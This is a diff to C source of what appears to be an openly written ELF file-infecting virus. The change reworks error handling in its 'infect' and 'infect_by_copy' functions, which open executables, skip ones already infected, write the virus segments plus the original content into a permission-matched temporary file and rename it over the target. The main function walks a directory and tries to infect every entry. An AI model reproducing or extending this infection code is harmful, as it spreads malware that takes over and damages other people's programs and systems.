@@ -284,23 +284,22 @@ static int is_possibly_infected(int fd) {
 
 static int infect_by_copy(const char *path) {
     const struct virus_info *info = virus_info();
-    int result = 0;
 
     int fd = open(path, O_RDONLY | O_NOFOLLOW);
     if (fd == -1) {
-        result = errno;
-        goto exit;
+        return -errno;
     }
 
+    int result;
     struct stat stat;
     if (fstat(fd, &stat)) {
-        result = errno;
+        result = -errno;
         goto close_fd;
     }
 
-    result = -is_possibly_infected(fd);
-    if (result > 0) goto close_fd;
-    if (result < 0) {
+    result = is_possibly_infected(fd);
+    if (result < 0) goto close_fd;
+    if (result > 0) {
         result = 0;
         goto close_fd;
     }
@@ -308,17 +307,17 @@ static int infect_by_copy(const char *path) {
     char tmp_name[] = "XXXXXX";
     int tmp_fd = mkstemp(tmp_name);
     if (tmp_fd == -1) {
-        result = errno;
+        result = -errno;
         goto close_fd;
     }
 
     result = fchmod(tmp_fd, ~S_IFMT & stat.st_mode);
     if (result == -1) {
-        result = errno;
+        result = -errno;
         goto close_fd;
     }
 
-    result = posix_fallocate(tmp_fd, 0, stat.st_size + info->size);
+    result = -posix_fallocate(tmp_fd, 0, stat.st_size + info->size);
     if (result) {
         goto close_tmp;
     }
@@ -335,7 +334,7 @@ static int infect_by_copy(const char *path) {
                 struct io_all_result io_result = pwrite_all(
                     tmp_fd, segment, header->p_filesz, header->p_offset);
                 if (io_result.remaining > 0) {
-                    result = io_result.err;
+                    result = -io_result.err;
                     goto close_tmp;
                 }
                 break;
@@ -360,7 +359,7 @@ static int infect_by_copy(const char *path) {
                 struct io_all_result io_result = pwritev_all(
                     tmp_fd, iov, iovcnt, header->p_offset);
                 if (io_result.remaining > 0) {
-                    result = io_result.err;
+                    result = -io_result.err;
                     goto close_tmp;
                 }
                 break;
@@ -381,7 +380,7 @@ static int infect_by_copy(const char *path) {
                 struct io_all_result io_result = pwritev_all(
                     tmp_fd, iov, iovcnt, header->p_offset);
                 if (io_result.remaining > 0) {
-                    result = io_result.err;
+                    result = -io_result.err;
                     goto close_tmp;
                 }
                 break;
@@ -392,7 +391,7 @@ static int infect_by_copy(const char *path) {
                     &stat.st_size, sizeof(stat.st_size),
                     header->p_offset);
                 if (io_result.remaining > 0) {
-                    result = io_result.err;
+                    result = -io_result.err;
                     goto close_tmp;
                 }
 
@@ -400,14 +399,14 @@ static int infect_by_copy(const char *path) {
                                                                    content);
                 off_t offset = lseek(tmp_fd, desired_offset, SEEK_SET);
                 if (offset != desired_offset) {
-                    result = errno;
+                    result = -errno;
                     goto close_tmp;
                 }
 
                 posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
                 io_result = sendfile_all(tmp_fd, fd, 0, stat.st_size);
                 if (io_result.remaining > 0) {
-                    result = io_result.err ? io_result.err : EINVAL;
+                    result = -(io_result.err ? io_result.err : EINVAL);
                     goto close_tmp;
                 }
                 break;
@@ -417,14 +416,14 @@ static int infect_by_copy(const char *path) {
 
     result = fsync(tmp_fd);
     if (result) {
-        result = errno;
+        result = -errno;
         goto close_tmp;
     }
 
     close(tmp_fd);
     result = rename(tmp_name, path);
     if (result) {
-        result = errno;
+        result = -errno;
         unlink(tmp_name);
     }
     goto close_fd;
@@ -436,30 +435,29 @@ close_tmp:
 close_fd:
     close(fd);
 
-exit:
     return result;
 }
 
 static int infect(const char *path) {
     const struct virus_info *info = virus_info();
-    int result = 0;
 
     int fd = open(path, O_RDWR);
     if (fd == -1) {
         return errno == EISDIR
-            ? errno
+            ? -errno
             : infect_by_copy(path);
     }
 
+    int result;
     struct stat stat;
     if (fstat(fd, &stat)) {
-        result = errno;
+        result = -errno;
         goto close_fd;
     }
 
-    result = -is_possibly_infected(fd);
-    if (result > 0) goto close_fd;
-    if (result < 0) {
+    result = is_possibly_infected(fd);
+    if (result < 0) goto close_fd;
+    if (result > 0) {
         result = 0;
         goto close_fd;
     }
@@ -555,7 +553,7 @@ int main(int argc, char *const argv[], char *const envp[]) {
 
             error = infect(entry.d_name);
             if (error) {
-                fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(error));
+                fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(-error));
             }
         }
         closedir(dir);
